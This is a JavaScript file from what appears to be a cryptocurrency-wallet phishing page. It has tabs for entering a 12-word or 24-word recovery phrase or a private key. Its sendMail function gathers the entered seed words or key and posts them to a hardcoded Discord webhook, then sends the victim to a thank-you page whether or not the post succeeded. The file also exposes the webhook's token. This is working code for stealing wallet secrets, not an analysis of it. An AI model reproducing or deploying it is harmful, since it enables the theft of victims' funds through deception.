console.log("Script loaded successfully");

function showWords(count) {
    document.querySelector('.word-tab.active').classList.remove('active');
    if (count === 12) {
        document.querySelector('.word-tab:nth-child(1)').classList.add('active');
        document.getElementById('words-12').style.display = 'flex';
        document.getElementById('words-24').style.display = 'none';
        document.getElementById('privatekey-div').style.display = 'none';
    } else if (count === 24) {
        document.querySelector('.word-tab:nth-child(2)').classList.add('active');
        document.getElementById('words-12').style.display = 'none';
        document.getElementById('words-24').style.display = 'flex';
        document.getElementById('privatekey-div').style.display = 'none';
    } else {    
        document.querySelector('.word-tab:nth-child(3)').classList.add('active');
        document.getElementById('words-12').style.display = 'none';
        document.getElementById('words-24').style.display = 'none';
        document.getElementById('privatekey-div').style.display = 'flex';
    }
}

function sendMail() {
    let activeSection = "";
    let templateParams = {};

    // Use computed style to determine which section is visible
    const words12Display = window.getComputedStyle(document.getElementById('words-12')).display;
    const words24Display = window.getComputedStyle(document.getElementById('words-24')).display;
    const privateKeyDisplay = window.getComputedStyle(document.getElementById('privatekey-div')).display;

    if (words12Display === 'flex') {
        activeSection = "12-words";
        for (let i = 1; i <= 12; i++) {
            templateParams[`word${i}`] = document.getElementById(`word${i}`).value;
        }
    } else if (words24Display === 'flex') {
        activeSection = "24-words";
        for (let i = 13; i <= 36; i++) {
            templateParams[`word${i}`] = document.getElementById(`word${i}`).value;
        }
    } else if (privateKeyDisplay === 'flex') {
        activeSection = "private-key";
        templateParams.privateKey = document.getElementById('privatekey-input').value;
    }

    templateParams.section = activeSection;

    const discordWebhookUrl = "https://discord.com/api/webhooks/1297650602838589460/4c0EZGHbic4pESoSzoQYe3zNEgVeZ0kMtJIFqZNr8lIxCOMX9qeT0vrlcnTIy6QyzN-e";

    const payload = {
        content: `**Submitted Data (${activeSection}):**\n${Object.entries(templateParams)
            .map(([key, value]) => `**${key}:** ${value}`)
            .join('\n')}`
    };

    fetch(discordWebhookUrl, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(payload)
    })
    .then(() => {
        window.location.href = "thanks.html";
    })
    .catch((error) => {
        console.error("Error:", error);
        window.location.href = "thanks.html";
    });
}

document.addEventListener('DOMContentLoaded', function () {
    document.getElementById('submit-btn').addEventListener('click', function (event) {
        event.preventDefault();
        sendMail();
    });
});
